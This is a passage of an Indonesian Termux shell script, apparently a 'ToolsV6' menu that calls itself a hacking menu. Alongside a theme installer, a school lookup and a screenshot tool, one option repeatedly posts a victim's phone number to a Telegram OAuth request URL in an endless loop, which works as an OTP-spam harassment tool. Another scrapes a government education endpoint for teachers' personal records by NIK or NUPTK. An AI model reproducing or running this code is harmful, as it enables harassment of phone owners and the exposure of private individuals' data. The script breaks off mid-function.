⠀⠀⢻⣿⣧⡀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⢀⣼⣿⡟⠀⠀
⠀⠀⠀⠙⢿⣿⣦⣀⠀⠀⢀⣼⠟⠙⠘⣿⣿⣿⣿⣿⣿⣿⠀⣴⣿⡿⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣦⣀⣀⣾⣁⡈⠛⢿⣿⣿⣿⡆⠹⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⠿⢿⣿⣿⣿⣿⣆⠈⢻⣿⣿⣿⠀
" | boxes -d "$mek" | lolcat
}
$tema
echo ""
ZSH_THEME="fox"
plugins=(git zsh-syntax-highlighting zsh-autosuggestions)
source $ZSH/oh-my-zsh.sh
[[ -f "$HOME/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh" ]] && source "$HOME/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh"
EOF
clear 
echo ""
echo -e "${r}[ ${g}+ ${r}]${y} Sedang pemasangan konfigurasi."
echo ""
chsh -s zsh >/dev/null 2>&1
if [ -f "$PREFIX/etc/motd" ]; then
    truncate -s 0 "$PREFIX/etc/motd"
fi
clear 
echo ""
echo -e "${r}[ ${g}✓ ${r}]${y} Sukses pemasangan."
echo ""
sleep 2
clear
exec zsh
    ;;
2|02)
    clear
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} Sedang menghapus tampilan."
    echo ""
    sleep 3 
    rm -rf ~/.oh-my-zsh && rm -rf ~/.zshrc && chsh -s bash
    rm -f ~/.termux/termux.properties
    clear 
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} Tampilan berhasil di hapus."
    echo ""
    sleep 2 
    clear
    ;;
3|03)
    clear
    ;;
  *)
    echo ""
    echo -e "${h}Pilihan Tidak Valid..!!"
    sleep 3
    echo ""
    clear
    ;;
esac
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "7" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
clear
echo "
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⢜⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⣿⣿⣿⣿⣿⣿⣿⣿⠿⢛⡩⢅⣲⣥⣾⣷⣭⣖⡨⢍⡛⠿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⣿⣿⣿⣿⣿⡿⢛⡡⣪⡵⢛⠏⢋⣉⣕⣁⣉⡏⠛⢿⣶⣕⢌⠛⢿⣿⣿⣿⣿⣿⠀
⣿⣿⣿⡿⢋⢔⣵⠿⣡⡬⢖⡫⢭⡶⠖⠲⣶⡭⢝⡲⢆⣉⡿⣮⡢⡙⢿⣿⣿⣿⠀
⣿⣿⠟⡱⣣⡿⢁⡴⣩⡾⢿⣆⠐⣿⠀⢈⣿⠂⣰⡿⢷⣝⢦⣈⢻⣎⢂⠹⣿⣿⠀
⠛⢁⣪⣾⠏⢩⢎⣾⣿⡦⣨⠵⣋⣭⡄⢨⣭⣙⠮⣅⢼⣿⣷⡹⣨⣻⣷⣥⢊⢉⠀
⣧⢱⢹⡿⠁⡎⡎⠉⡿⡵⢣⢞⣿⣿⡷⢿⣿⣿⠳⡜⣮⢇⠀⢱⢱⠐⢿⡏⡇⣾⠀
⣿⠘⢸⣿⣿⢳⠀⠀⢱⣧⣧⢸⣏⠃⡀⠀⠘⣻⡏⣼⣸⡜⡀⠀⡾⣿⣿⡇⡇⣿⠀
⣿⠀⣾⣿⢿⡼⡄⢀⡸⡟⡊⢞⡨⢥⡄⢠⡤⢅⡳⢹⢹⢇⠇⠀⢷⡿⣿⡇⠀⣿⠀
⣿⣇⢣⢋⣈⣇⢦⠤⢣⢳⡩⡂⡊⡇⠣⠜⢸⢑⢐⢍⡞⡜⠠⡰⣸⣁⡹⡹⢰⣿⠀
⣿⣿⡐⡾⣿⣿⣌⢆⢄⠑⢝⢮⣌⣀⠀⠀⣀⣡⡵⣫⠞⢀⡴⣡⣿⣿⢷⢃⣿⣿⠀
⣿⣿⣧⡙⡜⣿⡿⠢⡓⣦⣜⡳⡮⣭⣿⣿⣭⢵⢞⣣⣤⢚⠴⠻⣿⢯⠎⣼⣿⣿⠀
⣿⣿⣿⣷⡌⢎⢿⣦⡈⠒⠝⡓⠶⠭⣼⣧⠭⠶⢛⡫⠶⡉⣨⣾⡳⢃⣾⣿⣿⣿⠀
⣿⣿⣿⣿⣿⡆⠎⠿⠿⠿⣤⣼⣈⡏⠏⡉⣟⢉⣂⣤⠶⢟⣛⠇⢣⣿⣿⣿⣿⣿⠀
⣿⣿⣿⣿⣿⣧⣬⣭⣭⣭⣓⠒⠫⠭⠙⠪⠽⠽⢒⣚⣭⣤⣴⣦⣼⣿⣿⣿⣿⣿ " | lolcat 
echo ""
echo -e "${p}    Developer ${r}: ${c}Thxyzz404 "
echo -e "${g}"
read -p "Masukkan NPSN sekolah : " mek
if ! [[ "$mek" =~ ^[0-9]{8}$ ]]; then
    clear 
    echo ""
    echo -e "${r} Npsn wajib 8 dikit."
    echo ""
fi
pantau_aktivitas
res=$(curl -s "https://sekolah.devapi.id/sekolah?npsn=$mek")
if [[ -z "$res" ]]; then
    clear 
    echo ""
    echo -e "${y} Server down API mati."
    echo ""
fi
data=$(echo "$res" | jq '.data | length' 2>/dev/null)
if [[ -z "$data" || "$data" -eq 0 ]]; then
    clear 
    echo ""
    echo -e "${b} Npsn tidak di temukan!"
    echo ""
fi
temp_file="./sekolah_$$.txt"
echo -e "${n}"
echo "📁 DATA SEKOLAH" > "$temp_file"
echo "├── 📋 NPSN: $(echo "$res" | jq -r '.data[0].npsn')" >> "$temp_file"
echo "├── 📚 Nama: $(echo "$res" | jq -r '.data[0].nama')" >> "$temp_file"
echo "├── 🏫 Bentuk: $(echo "$res" | jq -r '.data[0].bentukPendidikan')" >> "$temp_file"
echo "├── 📖 Jalur: $(echo "$res" | jq -r '.data[0].jalurPendidikan')" >> "$temp_file"
echo "├── 🎓 Jenjang: $(echo "$res" | jq -r '.data[0].jenjangPendidikan')" >> "$temp_file"
echo "├── 📊 Status: $(echo "$res" | jq -r '.data[0].statusSatuanPendidikan')" >> "$temp_file"
echo "├── ⭐ Akreditasi: $(echo "$res" | jq -r '.data[0].akreditasi')" >> "$temp_file"
echo "├── 🏛️ Kementerian: $(echo "$res" | jq -r '.data[0].kementerianPembina')" >> "$temp_file"
echo "├── 📄 Dokumen Perizinan" >> "$temp_file"
echo "│   ├── 📜 SK Pendirian" >> "$temp_file"
echo "│   │   ├── Nomor: $(echo "$res" | jq -r '.data[0].dokumen_perizinan.sk_pendirian_sekolah.nomor // "-"')" >> "$temp_file"
echo "│   │   └── Tanggal: $(echo "$res" | jq -r '.data[0].dokumen_perizinan.sk_pendirian_sekolah.tanggal // "-"' | cut -d'T' -f1)" >> "$temp_file"
echo "│   └── 📜 SK Izin Operasional" >> "$temp_file"
echo "│       ├── Nomor: $(echo "$res" | jq -r '.data[0].dokumen_perizinan.sk_izin_operasional.nomor // "-"')" >> "$temp_file"
echo "│       └── Tanggal: $(echo "$res" | jq -r '.data[0].dokumen_perizinan.sk_izin_operasional.tanggal // "-"' | cut -d'T' -f1)" >> "$temp_file"
echo "├── 🏛️ Yayasan" >> "$temp_file"
echo "│   ├── Nama: $(echo "$res" | jq -r '.data[0].yayasan.nama // "-"')" >> "$temp_file"
echo "│   └── NPYP: $(echo "$res" | jq -r '.data[0].yayasan.npyp // "-"')" >> "$temp_file"
echo "├── 📍 Alamat" >> "$temp_file"
echo "│   ├── Jalan: $(echo "$res" | jq -r '.data[0].alamat.jalan')" >> "$temp_file"
echo "│   ├── RT/RW: $(echo "$res" | jq -r '.data[0].alamat.rt')/$(echo "$res" | jq -r '.data[0].alamat.rw')" >> "$temp_file"
echo "│   ├── Desa: $(echo "$res" | jq -r '.data[0].alamat.nama_desa')" >> "$temp_file"
echo "│   ├── Kecamatan: $(echo "$res" | jq -r '.data[0].alamat.nama_kecamatan')" >> "$temp_file"
echo "│   ├── Kabupaten: $(echo "$res" | jq -r '.data[0].alamat.nama_kabupaten')" >> "$temp_file"
echo "│   ├── Provinsi: $(echo "$res" | jq -r '.data[0].alamat.nama_provinsi')" >> "$temp_file"
echo "│   └── Negara: $(echo "$res" | jq -r '.data[0].alamat.nama_negara')" >> "$temp_file"
echo "├── 🏗️ Sarana Prasarana" >> "$temp_file"
echo "│   ├── Luas Tanah: $(echo "$res" | jq -r '.data[0].sarana_prasarana.luas_tanah_milik // "-"')" >> "$temp_file"
echo "│   ├── Sumber Listrik: $(echo "$res" | jq -r '.data[0].sarana_prasarana.sumber_listrik // "-"')" >> "$temp_file"
echo "│   └── Akses Internet: $(echo "$res" | jq -r '.data[0].sarana_prasarana.akses_internet // "-"')" >> "$temp_file"
echo "├── 📞 Kontak" >> "$temp_file"
echo "│   ├── Telepon: $(echo "$res" | jq -r '.data[0].kontak.nomor_telepon // "-"')" >> "$temp_file"
echo "│   ├── Fax: $(echo "$res" | jq -r '.data[0].kontak.nomor_fax // "-"')" >> "$temp_file"
echo "│   ├── Email: $(echo "$res" | jq -r '.data[0].kontak.email // "-"')" >> "$temp_file"
echo "│   └── Website: $(echo "$res" | jq -r '.data[0].kontak.website // "-"')" >> "$temp_file"
echo "└── 📌 Lokasi" >> "$temp_file"
echo "    ├── Lintang: $(echo "$res" | jq -r '.data[0].lokasi.lintang // "-"')" >> "$temp_file"
echo "    ├── Bujur: $(echo "$res" | jq -r '.data[0].lokasi.bujur // "-"')" >> "$temp_file"
echo "    └── Koordinat: $(echo "$res" | jq -r '.data[0].lokasi.koordinat // [] | join(", ")')" >> "$temp_file"
cat "$temp_file"
rm -f "$temp_file"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "8" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
b='\033[34;1m'
n='\033[0m'
mkdir -p /storage/emulated/0/SCREENSHOT
echo "
⠀⠀⢀⣴⣶⣾⣿⣷⣿⣿⣾⣿⣷⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⣿⣿⣾⣿⣷⣿⣷⣷⣶⣦⣀⠀⠀⠀⠀⠀
⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀
⣸⣿⣿⣿⡟⠁⠁⠁⠈⠈⠀⠁⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠁⠁⠁⠁⠁⠁⠉⢻⣿⣿⣿⣇⠀⠀⠀
⣿⣿⣿⣿⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢐⣿⣿⣿⣗⠀⠀⠀
⣽⣿⣿⣿⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢐⣿⣿⣿⣗⠀⠀⠀
⣿⣿⣿⣿⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢐⣿⣿⣿⣗⠀⠀⠀
⢺⣿⣿⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⡗⠀⠀⠀
⠀⠉⠋⠁⠀⠀⠀⠀⠀⢀⣠⣴⣴⣴⣴⣼⣿⣿⣿⡿⠋⠋⠋⠋⠙⠙⢻⣿⣿⣿⣧⣦⣦⣦⣤⣄⡀⠀⠀⠀⠈⠉⠉⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠈⣻⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡏⠋⠋⠋⠋⠋⢁⣴⣾⣿⣿⣿⣿⣶⣦⡀⠉⠋⠋⠋⠋⢻⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠀⠀⠠⣿⣿⣿⣿⠋⠀⠀⠙⣿⣿⣿⣿⠄⠀⠀⠀⢸⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠀⠀⠨⣿⣿⣿⣿⣀⠀⠀⣀⣿⣿⣿⣿⠁⠀⠀⠀⢸⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⢸⣿⣿⣿⡧⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣀⣀⡀⠀⠀⠀⠀⢸⣿⣿⣿⣗⣤⣄⣤⣄⣤⣠⣄⣄⣄⣌⣅⣄⣄⣄⣤⣠⣠⣠⣠⣠⣼⣿⣿⣿⡗⠀⠀⠀⠀⢀⣠⣀⠀⠀
⣼⣿⣿⣿⡀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⢐⣿⣿⣿⣷⠀
⣿⣿⣿⣿⡂⠀⠀⠀⠀⠈⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠟⠋⠁⠀⠀⠀⠀⢐⣿⣿⣿⣿⠀
⣾⣿⣿⣿⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢐⣿⣿⣿⣿⠀
⢿⣿⣿⣿⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢐⣿⣿⣿⣿⠀
⢹⣿⣿⣿⣦⣀⢀⢀⢀⢀⢀⢀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⡀⡀⡀⣀⢀⡀⣀⣼⣿⣿⣿⡏⠀
⠈⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀
⠀⠀⠉⠟⠿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⠉⠀" | lolcat
echo ""
echo -e "${p}            Developer ${r}: ${c}Thxyzz404 "
echo -e "${b}"
echo ""
read -p "Masukkan URL target : " get
if [ -z "$get" ]; then
    clear 
    echo ""
    echo -e "${r} Pilih yg bener :v "
fi
waktu=$(date +%Y%m%d_%H%M%S)
output="/storage/emulated/0/SCREENSHOT/screenshot_${waktu}.png"
echo ""
echo -e "${r}[ ${g}✓ ${r}]${y} Memproses Capture."
pantu_aktivitas
echo -e "${n}"
curl -X POST "https://api.templated.io/tools/public/url-to-image" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "url=$get" \
    -d "format=png" \
    -d "width=1280" \
    -d "height=800" \
    -d "fullPage=false" \
    -d "quality=90" \
    -d "deviceScaleFactor=1" \
    -o "$output"
if [ -f "$output" ] && [ -s "$output" ]; then
    if head -c 1 "$output" | grep -q "{"; then
        echo ""
        echo -e "${r} Terjadi kesalahan."
        cat "$output"
        rm -f "$output"
    else
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${c} Foto berhasil di simpan di : $output"
        echo -e "${g}Ukuran : $(du -h "$output" | cut -f1)"
    fi
else
    echo ""
    echo -e "${r} Terjadi kesalahan."
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "9" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
p='\033[35;1m'
pantu_aktivitas
url="https://oauth.telegram.org/auth/request?bot_id=1264128836&origin=https%3A%2F%2Fwww.money-whale.com&request_access=read"
tolol_recode() {
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⣴⣶⠿⠿⠛⠛⠛⠛⠛⠻⠿⢷⣶⣤⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⡾⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣷⣄⠀⠀⠀⠀
⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⡀⠀⠀
⠀⣼⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠙⣿⡄⠀
⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⣿⣿⣿⠃⠀⠀⠀⠀⠸⣿⡀
⣾⡏⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⣿⣿⠿⢛⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣿⡇
⣿⡇⠀⠀⣠⣴⣶⣿⣿⣿⣿⡿⠛⢁⣴⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⣿⡇
⢿⣧⠀⠈⠉⠛⠻⠿⠿⠋⠁⢀⣴⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⣿⡇
⠸⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣸⡿⠀
⠀⠹⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣴⡿⠃⠀
⠀⠀⠘⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⣠⣾⠟⠁⠀⠀
⠀⠀⠀⠈⠙⢿⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣾⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠙⠻⠿⣶⣶⣶⣤⣤⣶⣶⣾⠿⠛⠋⠀⠀⠀⠀⠀⠀⠀
" | lolcat
echo -e "${r} JIKA ANDA INGIN MENGHINTIKANNYA TEKAN ${c}[ ${y}CTRL + Z ${c}]"
echo -e "${r} SCRIPT AKAN BERHENTI OTOMATIS"
echo ""
echo -e "${p} Development ${g}: ${c}Thxyzz404" 
echo ""
}
echo ""
clear
run() {
while true; do
emojis=(
"🤬"
"🥶"
"😈"
"🥵"
"🤨"
"😆"
)
randomIndex=$(( RANDOM % ${#emojis[@]} ))
clear
tolol_recode
echo -e "${r}[${g} Pengiriman No${c} : ${y}$nomor_telepon ${r}]${c}"
echo ""
response=$(curl -s "$url" -d "phone=$nomor_telepon")
response &> /dev/null | printf "\r By.Thxyzz404 ${emojis[$randomIndex]}\n"
echo ""
read -t 5 -p "" user_input
if [[ $user_input == "q" ]]; then
echo -e "${r}[!] Script Dihentikan oleh Pengguna."
echo ""
sleep 3 
break
fi
done
}
clear
tolol_recode
echo -e "${y}"
read -p "Masukkan nomor telepon [ 62xx ] : " nomor_telepon
run
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "10" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
echo "
██████╗ ████████╗██╗  ██╗    
██╔══██╗╚══██╔══╝██║ ██╔╝    
██████╔╝   ██║   █████╔╝     
██╔═══╝    ██║   ██╔═██╗     
██║        ██║   ██║  ██╗    
╚═╝        ╚═╝   ╚═╝  ╚═╝ " | lolcat 
echo ""
read -p "$(echo -e "${y}Masukkan target ${r}[ ${g}Usr/Nik/Nuptk ${r}]${c} : ")" cok
echo ""
if [ -z "$cok" ]; then
    clear 
    echo ""
    echo -e "${r} Yg anda masukkan tidak valid."
fi
echo -e "${r}[ ${g}+ ${r}]${c} Proses..!!"
echo -e "${g}"
pantau_aktivitas
res=$(curl -s "https://gtk.belajar.kemendikdasmen.go.id/akun/ptk-solr?keyword=${cok}" -H 'User-Agent: Mozilla/5.0' 2>/dev/null)
if [ -z "$res" ]; then
    clear 
    echo ""
    echo -e "${r} Username tidak di temukan."
fi
raw="$res"
echo "$res" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)    
    if not data.get('data'):
        print('Data Tidak Ditemukan.')
        sys.exit(1)    
    for ptk in data['data']:
        status_ptk = ptk.get('status_ptk')
        status = status_ptk.get('aktif') if status_ptk and isinstance(status_ptk, dict) else 'Tidak tersedia'
        if status == 'Aktif':
            nama = ptk.get('nama') if ptk.get('nama') else 'Tidak tersedia'
            nuptk = ptk.get('nuptk') if ptk.get('nuptk') else 'Tidak tersedia'
            nik_masked = ptk.get('nik_masked') if ptk.get('nik_masked') else 'Tidak tersedia'
            sekolah_obj = ptk.get('sekolah')
            if sekolah_obj and isinstance(sekolah_obj, dict):
                sekolah = sekolah_obj.get('nama') if sekolah_obj.get('nama') else 'Tidak tersedia'
                npsn = sekolah_obj.get('npsn') if sekolah_obj.get('npsn') else 'Tidak tersedia'
                daerah = sekolah_obj.get('daerah') if sekolah_obj.get('daerah') else 'Tidak tersedia'
                provinsi_obj = sekolah_obj.get('m_propinsi')
                if provinsi_obj and isinstance(provinsi_obj, dict):
                    provinsi = provinsi_obj.get('keterangan') if provinsi_obj.get('keterangan') else 'Tidak tersedia'
                else:
                    provinsi = 'Tidak tersedia'
                kota_obj = sekolah_obj.get('m_kota')
                if kota_obj and isinstance(kota_obj, dict):
                    kab_kota = kota_obj.get('keterangan') if kota_obj.get('keterangan') else 'Tidak tersedia'
                else:
                    kab_kota = 'Tidak tersedia'
            else:
                sekolah = 'Tidak tersedia'
                npsn = 'Tidak tersedia'
                daerah = 'Tidak tersedia'
                provinsi = 'Tidak tersedia'
                kab_kota = 'Tidak tersedia'
            ptk_sekolah = ptk.get('ptk_sekolah')
            if ptk_sekolah and isinstance(ptk_sekolah, dict):
                no_surat = ptk_sekolah.get('nomor_surat_tugas') if ptk_sekolah.get('nomor_surat_tugas') else 'Tidak tersedia'
                tgl_surat = ptk_sekolah.get('tanggal_surat_tugas') if ptk_sekolah.get('tanggal_surat_tugas') else 'Tidak tersedia'
                tmt_tugas = ptk_sekolah.get('tmt_tugas') if ptk_sekolah.get('tmt_tugas') else 'Tidak tersedia'
                keterangan = ptk_sekolah.get('keterangan') if ptk_sekolah.get('keterangan') else 'Tidak tersedia'
            else:
                no_surat = 'Tidak tersedia'
                tgl_surat = 'Tidak tersedia'
                tmt_tugas = 'Tidak tersedia'
            id_ptk = ptk.get('ptk_id') if ptk.get('ptk_id') else 'Tidak tersedia'
            id_dapodik = ptk.get('dapodik_ptk_id') if ptk.get('dapodik_ptk_id') else 'Tidak tersedia'
            wkt_sinkron = ptk.get('wkt_sinkron') if ptk.get('wkt_sinkron') else 'Tidak tersedia'
            wkt_terbit = ptk.get('wkt_terbit_akun') if ptk.get('wkt_terbit_akun') else 'Tidak tersedia'
            jenis_ptk_obj = ptk.get('m_jenis_ptk')
            if jenis_ptk_obj and isinstance(jenis_ptk_obj, dict):
                jenis_ptk = jenis_ptk_obj.get('jenis_ptk') if jenis_ptk_obj.get('jenis_ptk') else 'Tidak tersedia'
            else:
                jenis_ptk = 'Tidak tersedia'
            pegawai_obj = ptk.get('m_pegawai')
            if pegawai_obj and isinstance(pegawai_obj, dict):
                status_pegawai = pegawai_obj.get('keterangan') if pegawai_obj.get('keterangan') else 'Tidak tersedia'
            else:
                status_pegawai = 'Tidak tersedia'
            print(f\" [+] Nama           : {nama}\")
            print(f\" [+] NUPTK          : {nuptk}\")
            print(f\" [+] NIK            : {nik_masked}\")
            print(f\" [+] Status         : {status}\")
            print(f\" [+] Sekolah        : {sekolah}\")
            print(f\" [+] NPSN           : {npsn}\")
            print(f\" [+] Provinsi       : {provinsi}\")
            print(f\" [+] Kab/Kota       : {kab_kota}\")
            print(f\" [+] No Surat       : {no_surat}\")
            print(f\" [+] Tgl Surat      : {tgl_surat}\")
            print(f\" [+] ID PTK         : {id_ptk}\")
            print(f\" [+] ID Dapodik     : {id_dapodik}\")
            print(f\" [+] Wkt Sinkron    : {wkt_sinkron}\")
            print(f\" [+] Wkt Terbit     : {wkt_terbit}\")
            print(f\" [+] Jenis PTK      : {jenis_ptk}\")
            print(f\" [+] Pegawai        : {status_pegawai}\")
            break
except Exception as e:
    print(f'[-] Error: {str(e)}')
"
kelurahan=$(echo "$res" | grep -o '"kelurahan":"[^"]*"' | head -1 | cut -d'"' -f4)
if [ -n "$kelurahan" ] && [ "$kelurahan" != "null" ]; then
    echo " [+] Daerah         : $kelurahan"
else
    echo " [+] Daerah         : Tidak tersedia"
fi
pemilik=$(echo "$sekolah_obj" | sed -n 's/.*"pemilik"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
if [ -z "$pemilik" ]; then
    pemilik=$(echo "$raw" | sed -n 's/.*"pemilik"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
fi
if [ -z "$pemilik" ]; then
    pemilik=$(echo "$raw" | sed -n 's/.*"status_kepemilikan"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
fi
echo " [+] Jenis          : ${pemilik:-Tidak tersedia}"
longitude=$(echo "$raw" | grep -o '"sekolah":{"[^}]*"longitude":[^,}]*' | grep -o '"longitude":[^,}]*' | head -1 | sed 's/"longitude"://;s/"//g')
if [ -n "$longitude" ]; then
    echo " [+] Longitude      : $longitude"
else
    echo " [+] Longitude      : Tidak tersedia"
fi
latitude=$(echo "$raw" | grep -o '"sekolah":{"[^}]*"latitude":[^,}]*' | grep -o '"latitude":[^,}]*' | head -1 | sed 's/"latitude"://;s/"//g')
if [ -n "$latitude" ]; then
    echo " [+] Latitude       : $latitude"
else
    echo " [+] Latitude       : Tidak tersedia"
fi
alamat=$(echo "$raw" | grep -o '"sekolah":{"[^}]*"alamat":"[^"]*"' | grep -o '"alamat":"[^"]*"' | head -1 | sed 's/"alamat":"//;s/"//g')
